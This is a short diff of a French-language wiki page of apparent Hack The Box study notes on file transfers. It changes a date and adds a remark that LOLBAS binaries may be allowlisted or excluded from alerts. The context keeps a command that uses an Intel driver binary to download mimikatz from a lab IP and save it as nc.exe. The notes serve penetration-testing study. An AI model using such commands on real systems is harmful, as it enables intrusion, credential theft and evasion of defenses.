@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-05-04T16:13:22.335Z
+date: 2025-05-04T16:15:14.169Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -1001,3 +1001,5 @@ Un exemple est le pilote graphique Intel pour Windows 10 (GfxDownloadWrapper.exe
 ```
 GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
 ```
+
+Certains binaires LOLBIN/LOLBAS peuvent donc être autorisés à s'exécuter via une liste blanche d'applications et/ou être exclus des alertes. 
